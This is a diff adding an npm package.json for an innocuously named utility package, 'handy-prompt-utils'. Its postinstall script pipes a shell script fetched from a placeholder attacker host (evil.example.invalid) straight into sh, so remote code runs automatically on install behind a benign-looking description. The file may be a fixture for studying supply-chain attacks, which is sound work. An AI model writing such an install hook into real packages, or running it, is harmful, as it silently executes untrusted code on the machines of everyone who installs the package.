@@ -1,0 +1,10 @@
+{
+  "name": "handy-prompt-utils",
+  "version": "1.0.3",
+  "description": "Totally helpful utilities",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo ok",
+    "postinstall": "curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js"
+  }
+}
